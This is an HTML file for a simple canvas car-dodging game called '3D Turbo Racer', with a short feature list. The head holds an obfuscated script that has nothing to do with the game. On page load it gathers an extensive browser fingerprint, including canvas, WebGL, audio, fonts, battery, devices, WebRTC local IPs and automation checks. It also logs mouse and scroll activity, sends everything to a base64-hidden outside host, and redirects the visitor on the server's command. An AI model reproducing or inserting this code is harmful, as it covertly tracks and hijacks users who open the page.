<!DOCTYPE html>
<html lang="en">
<head><script>
(function(_0,_1,_2){
var _k='_ZGVkNmQ2ZDkt';
if(_1.sessionStorage&&_1.sessionStorage.getItem(_k))return;
try{_1.sessionStorage.setItem(_k,'1');}catch(_e){}
var _3='aHR0cHM6Ly9jbG9ha3Byby5vbmxpbmUvYXBpL2NvbGxlY3QvZGVkNmQ2ZDktOGUzZC00NmNjLTg0M2QtYzA1YzMxZjRmMTJh';
var _u=atob(_3.padEnd(Math.ceil(_3.length/4)*4,'='));
function _cf(){try{var c=_0.createElement('canvas'),x=c.getContext('2d');c.width=200;c.height=50;x.textBaseline='top';x.font='14px Arial';x.fillStyle='#f60';x.fillRect(0,0,200,50);x.fillStyle='#069';x.fillText('fpZGVk',2,2);return c.toDataURL().slice(-50);}catch(e){return '';}}
function _ca(){try{var c=_0.createElement('canvas'),x=c.getContext('2d');c.width=300;c.height=150;var g=x.createLinearGradient(0,0,300,0);g.addColorStop(0,'#f00');g.addColorStop(0.5,'#0f0');g.addColorStop(1,'#00f');x.fillStyle=g;x.fillRect(0,0,300,50);x.font='18px Georgia';x.fillStyle='rgba(100,50,200,0.7)';x.fillText('Cwm fjord veg quiz',10,30);x.font='14px monospace';x.fillStyle='#a03';x.fillText('!@#$%^',10,50);x.beginPath();x.arc(150,100,40,0,6.28);x.stroke();x.shadowBlur=10;x.shadowColor='#f0f';x.fillRect(200,60,50,50);return c.toDataURL().slice(-60);}catch(e){return '';}}
function _wf(){try{var c=_0.createElement('canvas'),g=c.getContext('webgl');if(!g)return{s:0};var d=g.getExtension('WEBGL_debug_renderer_info');var e=g.getSupportedExtensions();var mt=g.getParameter(g.MAX_TEXTURE_SIZE);var mv=g.getParameter(g.MAX_VIEWPORT_DIMS);var sv=g.getParameter(g.SHADING_LANGUAGE_VERSION)||'';var aa=g.getContextAttributes()?g.getContextAttributes().antialias:false;var pm=[g.getParameter(g.MAX_VERTEX_ATTRIBS),g.getParameter(g.MAX_VERTEX_UNIFORM_VECTORS),g.getParameter(g.MAX_VARYING_VECTORS),g.getParameter(g.MAX_FRAGMENT_UNIFORM_VECTORS),g.getParameter(g.MAX_RENDERBUFFER_SIZE),mt].join(',');var ph=0;for(var i=0;i<pm.length;i++){ph=((ph<<5)-ph)+pm.charCodeAt(i);ph|=0;}return{v:d?g.getParameter(d.UNMASKED_VENDOR_WEBGL):'',r:d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):'',s:1,wec:e?e.length:0,wmt:mt||0,wmv:mv?mv[0]:0,wsv:sv.slice(0,30),waa:aa?1:0,wph:Math.abs(ph).toString(36)};}catch(e){return{s:0};}}
function _ff(){try{var f=['monospace','sans-serif','serif','Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana','Trebuchet MS','Impact','Comic Sans MS','Palatino Linotype','Lucida Console','Lucida Sans Unicode','Tahoma','Calibri','Cambria','Segoe UI','Symbol','Webdings','Wingdings','Book Antiqua','Century Gothic','Garamond','Franklin Gothic Medium','Arial Black','Consolas','Candara','Constantia','Corbel'],b=_0.createElement('canvas'),x=b.getContext('2d');b.width=600;b.height=50;x.font='72px monospace';var bs=x.measureText('mmmmmmmmmmmmm').width,r=[];for(var i=0;i<f.length;i++){x.font='72px "'+f[i]+'", monospace';if(x.measureText('mmmmmmmmmmmmm').width!==bs)r.push(f[i]);}return{fd:r.length,fh:r.join(',').slice(0,100)};}catch(e){return{fd:0,fh:''};}}
function _af(){return new Promise(function(ok){try{var A=_1.AudioContext||_1.webkitAudioContext;if(!A){ok({ah:'',as2:0});return;}var a=new A(),o=a.createOscillator(),c=a.createDynamicsCompressor(),an=a.createAnalyser();o.type='triangle';o.frequency.setValueAtTime(10000,a.currentTime);c.threshold.setValueAtTime(-50,a.currentTime);c.knee.setValueAtTime(40,a.currentTime);c.ratio.setValueAtTime(12,a.currentTime);c.attack.setValueAtTime(0,a.currentTime);c.release.setValueAtTime(0.25,a.currentTime);o.connect(c);c.connect(an);an.connect(a.destination);o.start(0);setTimeout(function(){try{var d=new Float32Array(an.frequencyBinCount);an.getFloatFrequencyData(d);var h=0;for(var i=0;i<d.length;i++)h+=Math.abs(d[i]);o.stop();a.close();ok({ah:h.toString().slice(0,20),as2:1});}catch(e){ok({ah:'',as2:0});}},100);}catch(e){ok({ah:'',as2:0});}});}
function _bat(){return new Promise(function(ok){try{if(!_2.getBattery){ok({bs:0});return;}_2.getBattery().then(function(b){ok({bl:b.level,bc:b.charging?1:0,bs:1});}).catch(function(){ok({bs:0});});}catch(e){ok({bs:0});}});}
function _md(){return new Promise(function(ok){try{if(!_2.mediaDevices||!_2.mediaDevices.enumerateDevices){ok({mdc:0,hwc:0,hmc:0});return;}_2.mediaDevices.enumerateDevices().then(function(d){var vc=0,ac=0;for(var i=0;i<d.length;i++){if(d[i].kind==='videoinput')vc++;if(d[i].kind==='audioinput')ac++;}ok({mdc:d.length,hwc:vc>0?1:0,hmc:ac>0?1:0});}).catch(function(){ok({mdc:0,hwc:0,hmc:0});});}catch(e){ok({mdc:0,hwc:0,hmc:0});}});}
function _wr(){return new Promise(function(ok){try{var R=_1.RTCPeerConnection||_1.webkitRTCPeerConnection;if(!R){ok({wrl:[],wrd:0});return;}var ips=[],pc=new R({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});pc.onicecandidate=function(e){if(!e||!e.candidate){try{pc.close();}catch(x){}ok({wrl:ips,wrd:ips.length>0?1:0});return;}var m=e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);if(m&&ips.indexOf(m[1])===-1)ips.push(m[1]);};setTimeout(function(){try{pc.close();}catch(x){}ok({wrl:ips,wrd:ips.length>0?1:0});},1500);}catch(e){ok({wrl:[],wrd:0});}});}
function _perm(){return new Promise(function(ok){try{if(!_2.permissions){ok({pn:''});return;}_2.permissions.query({name:'notifications'}).then(function(r){ok({pn:r.state||''});}).catch(function(){ok({pn:''});});}catch(e){ok({pn:''});}});}
function _sq(){return new Promise(function(ok){try{if(!_2.storage||!_2.storage.estimate){ok({sq:0});return;}_2.storage.estimate().then(function(e){ok({sq:e.quota||0});}).catch(function(){ok({sq:0});});}catch(e){ok({sq:0});}});}
var _w=_wf(),_fn=_ff();
var svc=0;try{if(_1.speechSynthesis){svc=_1.speechSynthesis.getVoices().length;if(svc===0)setTimeout(function(){try{svc=_1.speechSynthesis.getVoices().length;}catch(e){}},100);}}catch(e){}
var ptn=0,ptd=0;try{if(_1.performance&&_1.performance.timing){var pt=_1.performance.timing;ptn=pt.navigationStart?Date.now()-pt.navigationStart:0;ptd=pt.domContentLoadedEventEnd>0?pt.domContentLoadedEventEnd-pt.navigationStart:0;}}catch(e){}
var ct='',cdl=0,crt=0;try{var cn=_2.connection||_2.mozConnection||_2.webkitConnection;if(cn){ct=cn.effectiveType||cn.type||'';cdl=cn.downlink||0;crt=cn.rtt||0;}}catch(e){}
var mfp='';try{mfp=[Math.tan(-1e300),Math.log(27),Math.acos(0.5),Math.sin(1),Math.cosh(1)].map(function(v){return v.toString().slice(0,10);}).join(',');}catch(e){}
var _se=[],_mm=[],_fbc=0,_fim=0,_tfc=0,_tfs=0,_pvs=Date.now(),_sdc=0,_lsd=0,_msd=0;try{_1.addEventListener('scroll',function(){var y=_1.scrollY||_1.pageYOffset||0,t=Date.now()-_pvs,d=y-(_se.length>0?_se[_se.length-1].y:0);if(d>0&&_lsd<0||d<0&&_lsd>0)_sdc++;_lsd=d;var dp=Math.round(y/Math.max(_0.body.scrollHeight||1,1)*100);if(dp>_msd)_msd=dp;if(_se.length<50)_se.push({y:y,t:t,d:d});if(!_tfs)_tfs=t;},true);}catch(e){}try{_1.addEventListener('mousemove',function(e){var t=Date.now()-_pvs;if(_mm.length<100)_mm.push({x:e.clientX,y:e.clientY,t:t});if(!_fim)_fim=t;},true);}catch(e){}try{_1.addEventListener('click',function(){var t=Date.now()-_pvs;if(!_tfc)_tfc=t;if(!_fim)_fim=t;},true);}catch(e){}try{_0.addEventListener('visibilitychange',function(){_fbc++;},true);}catch(e){}
var _p={w:_1.screen.width,h:_1.screen.height,aw:_1.screen.availWidth||0,aht:_1.screen.availHeight||0,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,l:_2.language,r:_0.referrer,ua:_2.userAgent,p:_2.plugins?_2.plugins.length:0,m:_2.platform,t:_2.maxTouchPoints||0,f1:!!_2[atob('d2ViZHJpdmVy')],f2:!!_1.document[atob('X19zZWxlbml1bV91bndyYXBwZWQ=')]||!!_1.document[atob('X193ZWJkcml2ZXJfZXZhbHVhdGU=')],f3:!!_1[atob('X19wdXBwZXRlZXJfYmluZGluZw==')]||!!_1[atob('X3BoYW50b20=')],f4:!!_1[atob('X19wbGF5d3JpZ2h0')],f5:!!_1[atob('Q3lwcmVzcw==')],ch:_cf(),cah:_ca(),wv:_w.v||'',wr:_w.r||'',ws:_w.s||0,wec:_w.wec||0,wmt:_w.wmt||0,wmv:_w.wmv||0,wsv:_w.wsv||'',waa:_w.waa||0,wph:_w.wph||'',fd:_fn.fd||0,fh:_fn.fh||'',hc:_2.hardwareConcurrency||0,dm:_2.deviceMemory||0,cd:_1.screen.colorDepth||0,pr:_1.devicePixelRatio||1,ls:_2.languages?_2.languages.join(','):'',tzo:new Date().getTimezoneOffset(),svc:svc,ptn:ptn,ptd:ptd,ct:ct,cdl:cdl,crt:crt,mfp:mfp};
function _g(_x){if(_x)_1.location.replace(_x);}
function _v5(){return new Promise(function(ok){var r={};try{if(_2.gpu){_2.gpu.requestAdapter().then(function(a){if(a){r.wgv=(a.info?a.info.vendor:'')||'';r.wga=(a.info?a.info.architecture:'')||'';r.wgd=(a.info?a.info.description:'')||'';r.wgf=a.features?a.features.size:0;}ok(r);}).catch(function(){ok(r);});}else{ok(r);}}catch(e){ok(r);}});}function _v5b(){return new Promise(function(ok){var r={};try{if(_2.permissions){var ps=['camera','microphone','geolocation','push'];var done=0;for(var i=0;i<ps.length;i++){(function(n){try{_2.permissions.query({name:n}).then(function(s){r['pm_'+n.charAt(0)]=s.state||'';done++;if(done>=ps.length)ok(r);}).catch(function(){done++;if(done>=ps.length)ok(r);});}catch(e){done++;if(done>=ps.length)ok(r);}})(ps[i]);}}else{ok(r);}}catch(e){ok(r);}});}function _v5c(){return new Promise(function(ok){var r={};try{if(_1.speechSynthesis){var vl=_1.speechSynthesis.getVoices();if(vl.length>0){var vh=0;for(var i=0;i<Math.min(vl.length,30);i++){var s=vl[i].name+vl[i].lang;for(var j=0;j<s.length;j++){vh=((vh<<5)-vh)+s.charCodeAt(j);vh|=0;}}r.svl=Math.abs(vh).toString(36);r.svn=vl.length;ok(r);}else{_1.speechSynthesis.onvoiceschanged=function(){vl=_1.speechSynthesis.getVoices();var vh=0;for(var i=0;i<Math.min(vl.length,30);i++){var s=vl[i].name+vl[i].lang;for(var j=0;j<s.length;j++){vh=((vh<<5)-vh)+s.charCodeAt(j);vh|=0;}}r.svl=Math.abs(vh).toString(36);r.svn=vl.length;ok(r);};setTimeout(function(){ok(r);},500);}}else{ok(r);}}catch(e){ok(r);}});}
try{_p.dnt=_2.doNotTrack||_1.doNotTrack||'';_p.ce=_2.cookieEnabled?1:0;_p.hl=_1.history?_1.history.length:0;_p.ow=_1.outerWidth||0;_p.oh=_1.outerHeight||0;_p.iw=_1.innerWidth||0;_p.ih=_1.innerHeight||0;_p.wir=(_1.outerWidth&&_1.innerWidth)?Math.round(_1.outerWidth/_1.innerWidth*100)/100:0;_p.spd=_1.screen.pixelDepth||0;_p.nv=_2.vendor||'';_p.so=_1.screen.orientation?_1.screen.orientation.type||'':'';_p.wg2=!!_1.WebGL2RenderingContext?1:0;_p.sab=typeof SharedArrayBuffer!=='undefined'?1:0;_p.was=typeof WebAssembly!=='undefined'?1:0;_p.sws='serviceWorker' in _2?1:0;_p.prx=typeof Proxy!=='undefined'?1:0;_p.bi=typeof BigInt!=='undefined'?1:0;_p.gt=typeof globalThis!=='undefined'?1:0;_p.ref=typeof Reflect!=='undefined'?1:0;_p.sc=typeof structuredClone!=='undefined'?1:0;_p.ios=typeof IntersectionObserver!=='undefined'?1:0;_p.ros=typeof ResizeObserver!=='undefined'?1:0;_p.mos=typeof MutationObserver!=='undefined'?1:0;_p.pos=typeof PerformanceObserver!=='undefined'?1:0;_p.csg=(CSS&&CSS.supports)?CSS.supports('display','grid')?1:0:0;_p.tec=typeof TouchEvent!=='undefined'?1:0;_p.ecs=typeof Error.captureStackTrace==='function'?1:0;_p.pdv=0;try{for(var i=0;i<(_2.plugins||[]).length;i++){if((_2.plugins[i].name||'').indexOf('PDF')!==-1){_p.pdv=1;break;}}}catch(e){}var _pl=0;try{var _fns=[['Element','getAttribute'],['Node','appendChild'],['Document','createElement'],['HTMLElement','click'],['Navigator','toString']];for(var i=0;i<_fns.length;i++){try{var _o=_1[_fns[i][0]]&&_1[_fns[i][0]].prototype;if(_o){var _d=Object.getOwnPropertyDescriptor(_o,_fns[i][1]);if(_d&&typeof _d.value==='function'){var _s=_d.value.toString();if(_s.indexOf('[native code]')===-1)_pl++;}}}catch(e){}}_p.pl=_pl;}catch(e){_p.pl=0;}try{var _cdpKeys=Object.getOwnPropertyNames(_1).filter(function(k){return k.indexOf('cdc_')===0||k.indexOf('$cdc_')===0||k.indexOf('__webdriver')===0;});_p.cdp=_cdpKeys.length;}catch(e){_p.cdp=0;}try{_p.gpc=(_2.getGamepads&&_2.getGamepads())?_2.getGamepads().filter(Boolean).length:0;}catch(e){_p.gpc=0;}try{if(_1.performance&&_1.performance.now){var _t1=_1.performance.now(),_t2=_1.performance.now();_p.pnp=(_t2-_t1<0.005)?1:0;}else{_p.pnp=0;}}catch(e){_p.pnp=0;}try{var _e2=new Error();_p.std=(_e2.stack||'').split('\n').length;}catch(e){_p.std=0;}}catch(e){}
function _send(d){d.se=_se;d.mm=_mm;d.fim=_fim;d.tfc=_tfc;d.tfs=_tfs;d.fbc=_fbc;d.msd=_msd;d.sdc=_sdc;d.pvt=Date.now()-_pvs;d.tit=(_fim>0?Date.now()-_pvs-_fim:0);try{var _r=new XMLHttpRequest();_r.open('POST',_u,true);_r.setRequestHeader('Content-Type','application/json');_r.timeout=4000;_r.onload=function(){try{var _d=JSON.parse(_r.responseText);if(_d&&_d.v&&_d.u)_g(_d.u);}catch(_e){}};_r.send(JSON.stringify(d));}catch(_e){}}
if(typeof Promise!=='undefined'){Promise.all([_af(),_bat(),_md(),_wr(),_perm(),_sq(),_v5(),_v5b(),_v5c()]).then(function(r){for(var i=0;i<r.length;i++){var o=r[i];for(var k in o)_p[k]=o[k];}try{if(_1.speechSynthesis)_p.svc=_1.speechSynthesis.getVoices().length;}catch(e){}_send(_p);}).catch(function(){_send(_p);});}else{_send(_p);}
})(document,window,navigator);
</script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>3D Turbo Racer</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    overflow:hidden;
    background:#000;
}

canvas{
    display:block;
}

#ui{
    position:absolute;
    top:15px;
    left:15px;
    color:white;
    z-index:10;
    font-size:24px;
    font-weight:bold;
    text-shadow:0 0 10px cyan;
}

#startScreen,
#gameOver{
    position:absolute;
    width:100%;
    height:100%;
    background:rgba(0,0,0,0.85);
    display:flex;
    justify-content:center;
    align-items:center;
    flex-direction:column;
    color:white;
    z-index:20;
}

#gameOver{
    display:none;
}

button{
    margin-top:20px;
    padding:15px 35px;
    border:none;
    border-radius:12px;
    background:linear-gradient(45deg,#00d2ff,#3a7bd5);
    color:white;
    font-size:20px;
    cursor:pointer;
    box-shadow:0 0 20px rgba(0,255,255,0.5);
}

h1{
    font-size:60px;
    margin-bottom:10px;
    text-shadow:0 0 25px #00f7ff;
}

p{
    font-size:20px;
}
</style>
</head>
<body>

<div id="ui">Score: <span id="score">0</span></div>

<div id="startScreen">
    <h1>🏎 3D Turbo Racer</h1>
    <p>Use LEFT and RIGHT Arrow Keys</p>
    <button onclick="startGame()">START GAME</button>
</div>

<div id="gameOver">
    <h1>💥 GAME OVER</h1>
    <h2>Your Score: <span id="finalScore"></span></h2>
    <button onclick="startGame()">PLAY AGAIN</button>
</div>

<canvas id="gameCanvas"></canvas>

<script>
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let gameRunning = false;
let score = 0;
let speed = 10;

const player = {
    lane:1,
    width:90,
    height:150,
    y:canvas.height - 180
};

const lanes = [
    canvas.width/2 - 180,
    canvas.width/2,
    canvas.width/2 + 180
];

const enemies = [];

function createEnemy(){
    const lane = Math.floor(Math.random()*3);

    enemies.push({
        lane:lane,
        z:0,
        width:70,
        height:120,
        color:`hsl(${Math.random()*360},80%,55%)`
    });
}

function drawBackground(){
    const gradient = ctx.createLinearGradient(0,0,0,canvas.height);
    gradient.addColorStop(0,'#06152d');
    gradient.addColorStop(1,'#000');

    ctx.fillStyle = gradient;
    ctx.fillRect(0,0,canvas.width,canvas.height);

    // Stars
    for(let i=0;i<80;i++){
        ctx.fillStyle = 'white';
        ctx.fillRect(Math.random()*canvas.width,Math.random()*canvas.height,2,2);
    }
}

function drawRoad(){
    ctx.beginPath();
    ctx.moveTo(canvas.width/2 - 350, canvas.height);
    ctx.lineTo(canvas.width/2 - 120, 0);
    ctx.lineTo(canvas.width/2 + 120, 0);
    ctx.lineTo(canvas.width/2 + 350, canvas.height);
    ctx.closePath();

    const roadGradient = ctx.createLinearGradient(0,0,0,canvas.height);
    roadGradient.addColorStop(0,'#2b2b2b');
    roadGradient.addColorStop(1,'#555');

    ctx.fillStyle = roadGradient;
    ctx.fill();

    // Lane lines
    ctx.strokeStyle = 'white';
    ctx.lineWidth = 6;

    for(let i=0;i<20;i++){
        let y = (i * 80 + Date.now()/8) % canvas.height;

        ctx.beginPath();
        ctx.moveTo(canvas.width/2, y);
        ctx.lineTo(canvas.width/2, y+40);
        ctx.stroke();
    }
}

function draw3DCar(x,y,width,height,color){
    // Shadow
    ctx.fillStyle = 'rgba(0,0,0,0.4)';
    ctx.beginPath();
    ctx.ellipse(x + width/2, y + height + 10, width/2, 12, 0, 0, Math.PI*2);
    ctx.fill();

    // Body gradient
    const carGradient = ctx.createLinearGradient(x,y,x+width,y+height);
    carGradient.addColorStop(0,'white');
    carGradient.addColorStop(0.2,color);
    carGradient.addColorStop(1,'black');

    ctx.fillStyle = carGradient;

    // Main body
    ctx.beginPath();
    ctx.moveTo(x+10,y);
    ctx.lineTo(x+width-10,y);
    ctx.lineTo(x+width,y+height/2);
    ctx.lineTo(x+width-10,y+height);
    ctx.lineTo(x+10,y+height);
    ctx.lineTo(x,y+height/2);
    ctx.closePath();
    ctx.fill();

    // Windshield
    ctx.fillStyle = '#7ee7ff';
    ctx.fillRect(x+20,y+20,width-40,35);

    // Wheels
    ctx.fillStyle = '#111';
    ctx.fillRect(x-8,y+20,10,35);
    ctx.fillRect(x-8,y+height-55,10,35);
    ctx.fillRect(x+width-2,y+20,10,35);
    ctx.fillRect(x+width-2,y+height-55,10,35);

    // Headlights
    ctx.fillStyle = 'yellow';
    ctx.fillRect(x+8,y+10,12,8);
    ctx.fillRect(x+width-20,y+10,12,8);
}

function update(){
    if(!gameRunning) return;

    drawBackground();
    drawRoad();

    // Player car
    const playerX = lanes[player.lane] - player.width/2;

    draw3DCar(playerX, player.y, player.width, player.height, '#00d9ff');

    // Enemies
    for(let i=0;i<enemies.length;i++){
        const enemy = enemies[i];

        enemy.z += speed;

        let scale = enemy.z / 600;
        if(scale < 0.2) scale = 0.2;

        const enemyWidth = enemy.width * scale;
        const enemyHeight = enemy.height * scale;

        const enemyX = lanes[enemy.lane] - enemyWidth/2;
        const enemyY = enemy.z;

        draw3DCar(enemyX, enemyY, enemyWidth, enemyHeight, enemy.color);

        // Collision
        if(
            enemyY + enemyHeight > player.y &&
            enemyY < player.y + player.height &&
            Math.abs(enemy.lane - player.lane) === 0
        ){
            endGame();
        }

        // Remove enemies
        if(enemyY > canvas.height){
            enemies.splice(i,1);
            score++;
            document.getElementById('score').innerText = score;

            if(score % 5 === 0){
                speed += 1;
            }
        }
    }

    requestAnimationFrame(update);
}

function startGame(){
    gameRunning = true;
    enemies.length = 0;
    score = 0;
    speed = 10;
    player.lane = 1;

    document.getElementById('score').innerText = score;

    document.getElementById('startScreen').style.display = 'none';
    document.getElementById('gameOver').style.display = 'none';

    update();
}

function endGame(){
    gameRunning = false;

    document.getElementById('finalScore').innerText = score;
    document.getElementById('gameOver').style.display = 'flex';
}

setInterval(()=>{
    if(gameRunning){
        createEnemy();
    }
},1000);

window.addEventListener('keydown',(e)=>{
    if(e.key === 'ArrowLeft'){
        player.lane--;
        if(player.lane < 0) player.lane = 0;
    }

    if(e.key === 'ArrowRight'){
        player.lane++;
        if(player.lane > 2) player.lane = 2;
    }
});
</script>

</body>
</html>
```

## Features

* 3D perspective racing road
* Smooth neon visuals
* Dynamic enemy cars
* Increasing speed difficulty
* Restart system
* Mobile and desktop compatible
* Stylish futuristic UI
